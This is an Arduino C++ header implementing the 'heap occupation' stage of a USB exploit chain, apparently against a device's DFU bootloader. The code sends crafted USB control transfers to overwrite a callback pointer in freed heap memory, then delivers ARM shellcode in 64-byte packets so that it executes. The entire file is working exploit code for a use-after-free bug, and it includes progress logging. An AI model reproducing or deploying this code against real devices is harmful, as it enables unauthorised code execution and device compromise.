#ifndef HEAP_OCCUPATION_H
#define HEAP_OCCUPATION_H

#include <Arduino.h>
#include "Usb.h"
#include "../config/constants_named.h"
#include "../config/error_codes.h"
#include "../usb/usb_helpers.h"

/**
 * Heap Occupation Module
 * 
 * This module handles the final exploitation stage where we:
 * 1. Overwrite freed heap memory
 * 2. Deliver the ARM shellcode payload
 * 3. Trigger payload execution
 */

class HeapOccupation {
private:
  USB* usb;
  const uint8_t* overwrite_payload;
  const uint8_t* shellcode_payload;
  size_t shellcode_size;
  
public:
  /**
   * Constructor
   * @param usbInstance Pointer to USB instance
   * @param overwritePayload Pointer to overwrite data in PROGMEM
   * @param shellcodePayload Pointer to ARM shellcode in PROGMEM
   * @param shellcodeSize Size of shellcode payload
   */
  HeapOccupation(USB* usbInstance, 
                 const uint8_t* overwritePayload,
                 const uint8_t* shellcodePayload,
                 size_t shellcodeSize) 
    : usb(usbInstance), 
      overwrite_payload(overwritePayload),
      shellcode_payload(shellcodePayload),
      shellcode_size(shellcodeSize) {}
  
  /**
   * Execute heap occupation stage
   * 
   * This stage:
   * 1. Triggers heap occupation
   * 2. Overwrites callback pointer in freed memory
   * 3. Delivers ARM shellcode payload
   * 4. Triggers payload execution
   * 
   * @return Error code (ERR_NONE on success)
   */
  ExploitError execute() {
    Serial.println("\n=== STAGE 3: HEAP OCCUPATION ===");

    uint8_t tmpbuf[USB_PACKET_SIZE];
    uint8_t rcode;

    // Send overwrite data
    Serial.println("Sending overwrite data...");
    rcode = usb->ctrlReq_SETUP(0, 0, 0, 0, 0, 0, 0, USB_PACKET_SIZE);
    Serial.print("  SETUP: 0x");
    Serial.println(rcode, HEX);
    
    memset(tmpbuf, 0xcc, sizeof(tmpbuf));
    rcode = USBHelpers::sendOut(usb, tmpbuf, USB_PACKET_SIZE);
    Serial.print("  OUT (pre-packet): 0x");
    Serial.println(rcode, HEX);
    
    // Send actual overwrite payload
    USBHelpers::copyPayload(tmpbuf, overwrite_payload, 0, USB_PACKET_SIZE);
    rcode = USBHelpers::sendOut(usb, tmpbuf, USB_PACKET_SIZE);
    Serial.print("  OUT (overwrite): 0x");
    Serial.println(rcode, HEX);
    
    if(rcode) {
      Serial.println("ERROR: Overwrite failed!");
      return ERR_HEAP_OCCUPATION_FAILED;
    }

    // Send ARM shellcode payload
    Serial.print("Sending payload (");
    Serial.print(shellcode_size);
    Serial.println(" bytes)...");
    
    rcode = usb->ctrlReq_SETUP(0, 0, DFU_REQUEST_TYPE_H2D, DFU_REQUEST_DNLOAD, 
                               0, 0, 0, shellcode_size);
    Serial.print("  SETUP: 0x");
    Serial.println(rcode, HEX);
    
    memset(tmpbuf, 0xcc, sizeof(tmpbuf));
    rcode = USBHelpers::sendOut(usb, tmpbuf, USB_PACKET_SIZE);
    Serial.print("  OUT (pre-packet): 0x");
    Serial.println(rcode, HEX);
    
    // Send payload in 64-byte chunks
    int totalPackets = (shellcode_size + USB_PACKET_SIZE - 1) / USB_PACKET_SIZE;
    
    for(int i = 0; i < shellcode_size; i += USB_PACKET_SIZE) {
      USBHelpers::copyPayload(tmpbuf, shellcode_payload, i, USB_PACKET_SIZE);
      rcode = USBHelpers::sendOut(usb, tmpbuf, USB_PACKET_SIZE);
      
      int packetNum = (i / USB_PACKET_SIZE) + 1;
      Serial.print("  Payload packet ");
      Serial.print(packetNum);
      Serial.print("/");
      Serial.print(totalPackets);
      Serial.print(": 0x");
      Serial.println(rcode, HEX);
      
      if(rcode) {
        Serial.println("ERROR: Payload delivery failed!");
        return ERR_PAYLOAD_DELIVERY_FAILED;
      }
    }
    
    Serial.println("Heap occupation complete!");
    return ERR_NONE;
  }
};

#endif // HEAP_OCCUPATION_H
